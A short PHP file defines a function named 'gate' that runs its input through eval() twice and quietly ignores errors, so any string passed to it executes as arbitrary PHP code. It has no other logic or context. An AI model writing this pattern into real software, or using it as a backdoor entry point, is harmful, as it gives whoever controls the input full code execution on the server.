<?php
function gate($what,$who){
    try{
        $ans = $what;
        eval($ans);
        $what =$ans;
    }
    catch(Exception $e){}
    try{
        eval('$what='.$what.';');
    }
    catch(Exception $e){}
    return $what;
}

?>